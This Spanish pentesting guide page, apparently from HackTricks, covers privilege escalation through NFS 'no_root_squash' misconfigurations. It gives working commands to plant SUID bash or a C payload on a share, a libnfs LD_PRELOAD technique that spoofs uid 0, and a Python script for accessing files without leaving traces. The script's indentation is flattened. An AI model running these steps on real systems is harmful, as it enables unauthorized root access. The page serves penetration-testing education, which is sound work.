# Escalada de privilegios por configuración incorrecta de NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}


## Información básica sobre Squashing

NFS normalmente (especialmente en Linux) confía en el `uid` y `gid` indicados por el cliente que se conecta para acceder a los archivos (si no se utiliza Kerberos). Sin embargo, hay algunas configuraciones que se pueden establecer en el servidor para **cambiar este comportamiento**:

- **`all_squash`**: Hace squash de todos los accesos, asignando cada usuario y grupo a **`nobody`** (65534 unsigned / -2 signed). Por lo tanto, todos son `nobody` y no se utiliza ningún usuario.
- **`root_squash`/`no_all_squash`**: Esta es la configuración predeterminada en Linux y **solo hace squash de los accesos con uid 0 (root)**. Por lo tanto, se confía en cualquier `UID` y `GID`, pero `0` se convierte en `nobody` (por lo que no es posible ninguna suplantación de root).
- **`no_root_squash`**: Si esta configuración está habilitada, ni siquiera hace squash del usuario root. Esto significa que, si montas un directorio con esta configuración, puedes acceder a él como root.

En el archivo **/etc/exports**, si encuentras algún directorio configurado como **no_root_squash**, puedes **acceder** a él **como cliente** y **escribir dentro** de ese directorio **como** si fueras el **root** local de la máquina.

Para obtener más información sobre **NFS**, consulta:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Escalada de privilegios

### Exploit remoto

Opción 1 usando bash:
- **Montar ese directorio** en una máquina cliente y, **como root, copiar** dentro de la carpeta montada el binario **/bin/bash**, asignarle permisos **SUID** y **ejecutar desde la máquina víctima** ese binario de bash.
- Ten en cuenta que, para ser root dentro del recurso compartido NFS, **`no_root_squash`** debe estar configurado en el servidor.
- Sin embargo, si no está habilitado, podrías escalar a otro usuario copiando el binario al recurso compartido NFS y asignándole el permiso SUID como el usuario al que quieres escalar.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opción 2 usando código compilado en C:
- **Montar ese directorio** en una máquina cliente y, **como root, copiar** dentro de la carpeta montada nuestro payload compilado en C que abusará del permiso SUID, otorgarle permisos **SUID** y **ejecutar desde la máquina víctima** ese binario (puedes encontrar aquí algunos [payloads SUID en C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Las mismas restricciones que antes
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Exploit Local

> [!TIP]
> Ten en cuenta que si puedes crear un **túnel desde tu máquina hasta la máquina víctima, todavía puedes usar la versión Remote para explotar esta escalada de privilegios mediante el tunnelling de los puertos necesarios**.\
> El siguiente truco se utiliza en caso de que el archivo `/etc/exports` **indique una IP**. En este caso, **no podrás usar** de ninguna manera el **exploit remoto** y tendrás que **abusar de este truco**.\
> Otro requisito necesario para que el exploit funcione es que el **export dentro de `/etc/export`** **debe utilizar el flag `insecure`**.\
> --_No estoy seguro de que este truco funcione si `/etc/export` indica una dirección IP_--

### Información básica

El escenario consiste en explotar un recurso compartido NFS montado en una máquina local, aprovechando un fallo en la especificación de NFSv3 que permite al cliente especificar su uid/gid, lo que potencialmente permite obtener acceso no autorizado. La explotación consiste en utilizar [libnfs](https://github.com/sahlberg/libnfs), una librería que permite falsificar llamadas RPC de NFS.

#### Compilación de la librería

Los pasos de compilación de la librería podrían requerir ajustes según la versión del kernel. En este caso concreto, las syscalls de fallocate se comentaron. El proceso de compilación incluye los siguientes comandos:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Ejecución del Exploit

El exploit consiste en crear un programa C sencillo (`pwn.c`) que eleva los privilegios a root y después ejecuta un shell. El programa se compila y el binario resultante (`a.out`) se coloca en el share con suid root, usando `ld_nfs.so` para falsificar el uid en las llamadas RPC:

1. **Compilar el código del exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Coloca el exploit en el share y modifica sus permisos falsificando el uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Ejecuta el exploit para obtener privilegios de root:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell para el acceso sigiloso a archivos

Una vez obtenido el acceso root, se utiliza un script de Python (`nfsh.py`) para interactuar con el recurso compartido NFS sin cambiar la propiedad (para evitar dejar rastros). Este script ajusta el uid para que coincida con el del archivo al que se accede, lo que permite interactuar con los archivos del recurso compartido sin problemas de permisos:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Ejecutar así:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
